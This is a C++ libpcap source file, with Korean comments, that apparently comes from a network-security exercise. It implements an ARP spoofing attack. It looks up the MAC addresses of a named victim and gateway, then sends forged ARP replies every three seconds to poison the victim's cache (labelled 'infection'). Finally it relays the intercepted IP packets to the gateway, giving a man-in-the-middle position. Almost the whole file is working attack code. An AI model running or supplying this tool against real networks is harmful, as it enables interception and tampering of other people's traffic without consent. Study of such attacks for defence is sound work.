#include <iostream>
#include <stdio.h>
#include <pcap.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <thread>
#include <signal.h>

#pragma pack(push,1)
struct ho_ether
{
    uint8_t hoder_dhost[6];
    uint8_t hoder_shost[6];
    uint16_t hoder_type;
};
struct ho_arphdr
{
    uint16_t ar_hrd;
    uint16_t ar_pro;
    uint8_t ar_hln;
    uint8_t ar_pln;
    uint16_t ar_op;
    uint8_t arp_smac[6];
    uint32_t arp_sip;
    uint8_t arp_tmac[6];
    uint32_t arp_tip;
};
struct hoder
{
    struct ho_ether e;
    struct ho_arphdr a;
};
#pragma pack(pop)
#define BUFSIZE 10000

void (*stop)(int);
void sigint_handler(int a)
{
   printf("%d\nCtrl + C 키를 또 누르시면 종료됩니다.\n",a);
   signal(SIGINT, stop);
}

void make_packet(uint8_t *packet,struct hoder name, uint8_t *dhost, uint8_t *shost, uint16_t etype, uint16_t op, uint8_t *smac, uint32_t sip, uint8_t *tmac, uint32_t tip);
void getmac_from_str_to_bin(char *str,uint8_t *binmac);
void open_packet(pcap_t *go, int pkt, const u_char *pkt_info, struct pcap_pkthdr *pkt_header, uint32_t ip1, uint32_t ip2, uint8_t *box);
void check_info(const u_char *pkt_info, uint32_t vicip, uint32_t myip, uint8_t *box);
void infection(pcap_t *go, uint8_t *infect);
void go_relay(pcap_t *go, uint8_t *mymac, uint8_t *gatemac);


int main(int argc, char *argv[])
{
    stop = signal(SIGINT, sigint_handler);
    if(argc!=4)
    {
        printf("***** 인자값이 잘못되었거나 존재하지 않습니다 *****\n");
        printf("    >> 사용법 : <dev> <gateway ip> <victim ip>\n\n");
    }
    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev = argv[1];
    char *gatewayip = argv[2];
    uint32_t gateip = inet_addr(gatewayip);

    char *victimip = argv[3];
    uint32_t vicip = inet_addr(victimip);
    //인자로 가져온값 정리

    char mm[17];
    FILE *get_mac_info;
    get_mac_info=popen("ifconfig -a | grep ether | awk '{print $2}'","r");
    fgets(mm,18,get_mac_info);
    pclose(get_mac_info);
    uint8_t mymac[6];
    getmac_from_str_to_bin(mm,mymac);
    //get my mac !!

    char mip[14];
    FILE *get_ip_info;
    get_ip_info=popen("ip addr | grep 'inet' | grep brd | awk '{printf $2}' | awk -F/ ' {printf $1}'","r");
    fgets(mip,16,get_ip_info);
    pclose(get_ip_info);
    uint32_t myip=inet_addr(mip);;
    //get my ip !!

    uint8_t broadcast[6];
    memset(broadcast,255,6);

    pcap_t *go;
    if((go=pcap_open_live(dev,BUFSIZE,0,1,errbuf))==NULL)
    {
        perror("!!  DEV OPEN ERROR  !!");
        exit(1);
    }

    //MAKE REQ (GET VICTIM MAC)
    struct hoder req_get_vicmac;
    uint8_t req_get_vic_packet[sizeof(req_get_vicmac)];
    make_packet(req_get_vic_packet,req_get_vicmac,broadcast,mymac,htons(0x0806),htons(0x0001),mymac,myip,broadcast,vicip);
    if(pcap_sendpacket(go,(const u_char*)req_get_vic_packet,sizeof(req_get_vic_packet))!=0)
    {
        printf("ERROR SENDING THE PAKCET\n");
    }
    //GET VICTIM MAC FROM REPLY
    const u_char *vicmac_reply_pkt=0;
    struct pcap_pkthdr *vic_reply_header=0;
    int rep=0;
    uint8_t victim_mac[6];
    open_packet(go, rep, vicmac_reply_pkt, vic_reply_header, vicip, myip, victim_mac);


    //MAKE REQ (GET GATEWAY MAC)
    struct hoder req_get_gatemac;
    uint8_t req_get_gatemac_packet[sizeof(req_get_gatemac)];
    make_packet(req_get_gatemac_packet,req_get_gatemac,broadcast,mymac,htons(0x0806),htons(0x0001),mymac,myip,broadcast,gateip);
    if(pcap_sendpacket(go,(const u_char*)req_get_gatemac_packet,sizeof(req_get_gatemac_packet))!=0)
    {
        printf("ERROR SENDING THE PAKCET\n");
    }
    //GET GATEWAY MAC FROM REPLY
    const u_char *gatemac_reply_pkt=0;
    struct pcap_pkthdr *gate_reply_header=0;
    int rek=0;
    uint8_t gate_mac[6];
    open_packet(go, rek, gatemac_reply_pkt, gate_reply_header, gateip, myip, gate_mac);
    pcap_close(go);

    if((go=pcap_open_live(dev,BUFSIZE,1,1,errbuf))==NULL)
    {
        perror("!!  DEV OPEN ERROR  !!");
        exit(1);
    }
    //MAKE RELAY

    //MAKE INFECTION PACKET
    struct hoder rep_infect;
    uint8_t infect_pkt[sizeof(rep_infect)];
    make_packet(infect_pkt,rep_infect,victim_mac,mymac,htons(0x0806),htons(0x0002),mymac,gateip,victim_mac,vicip);
    std::thread t1(&infection,go,infect_pkt);
    go_relay(go, mymac, gate_mac);
    t1.join();
}

void getmac_from_str_to_bin(char *str,uint8_t *binmac)
{
    sscanf((const char*)str,"%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",&binmac[0],&binmac[1],&binmac[2],&binmac[3],&binmac[4],&binmac[5]);
}
void make_packet(uint8_t *packet,struct hoder name, uint8_t *dhost, uint8_t *shost, uint16_t etype, uint16_t op, uint8_t *smac, uint32_t sip, uint8_t *tmac, uint32_t tip)
{
    memcpy(name.e.hoder_dhost,dhost,6);
    memcpy(name.e.hoder_shost,shost,6);
    name.e.hoder_type=etype;
    name.a.ar_hrd = htons(0x0001);
    name.a.ar_pro = htons(ETHERTYPE_IP);
    name.a.ar_hln = 0x06;
    name.a.ar_pln = 0x04;
    name.a.ar_op  = op;
    memcpy(name.a.arp_smac,smac,6);
    name.a.arp_sip=sip;
    memcpy(name.a.arp_tmac,tmac,6);
    name.a.arp_tip=tip;
    memcpy(packet,&name,sizeof(name));
}
void open_packet(pcap_t *go, int pkt, const u_char *pkt_info, struct pcap_pkthdr *pkt_header,uint32_t ip1, uint32_t ip2, uint8_t *box)
{
    while((pkt = pcap_next_ex(go, &pkt_header, &pkt_info))>=0)
    {
        if(pkt==1)
        {
            check_info(pkt_info,ip1,ip2,box);
            break;
        }
        else if(pkt==0)
        {
            printf("TIME OUT\n");
            continue;
        }
        else
            break;
    }
}
void check_info(const u_char *pkt_info, uint32_t vicip, uint32_t myip, uint8_t *box)
{
    struct hoder *ep;
    ep=(struct hoder*)pkt_info;
    if((ep->a.arp_sip)==vicip && ep->a.arp_tip==myip)
    {
        memcpy(box,ep->a.arp_smac,6);
    }
}
void infection(pcap_t *go, uint8_t *infect)
{
    uint8_t packet[42];
    memcpy(packet,infect,42);
    printf(" INFECTION START !! \n");

    while(go!=NULL)
    {
         printf(">> send infection packet\n");
         pcap_sendpacket(go,(const u_char*)packet, sizeof(packet));
         sleep(3);
    }
    /*
    리커버 되는경우도 되게 만들기
    if()
    */
}
void go_relay(pcap_t *go,uint8_t *mymac, uint8_t *gatemac)
{
    int lay;
    const u_char *pkt;
    pcap_pkthdr *header;
    uint8_t pack_tmac[6];
    uint8_t match_my[6];
    memcpy(match_my,mymac,6);
    while(true)
    {
        while((lay = pcap_next_ex(go, &header, &pkt))>=0)
        {
            if(lay==1)
            {
                struct hoder *ly;
                ly=(struct hoder*)pkt;
                memcpy(pack_tmac,ly->e.hoder_dhost,6);
                if(ly->e.hoder_type==htons(ETHERTYPE_IP))
                {
                    printf(">> ETHER TYPE ACCORD \n");
                    if(memcmp(pack_tmac,match_my,6)==0)
                    {
                           printf(" >> ACCORD ALL CONDITION << \n");
                           memcpy(ly->e.hoder_shost,mymac,6);
                           memcpy(ly->e.hoder_dhost,gatemac,6);
                           pcap_sendpacket(go,(u_char*)ly,header->caplen);
                           break;
                    }
                }
            }
            else if(lay==0)
            {
                printf("TIME OUT\n");
                continue;
            }
         }
      }
}
 
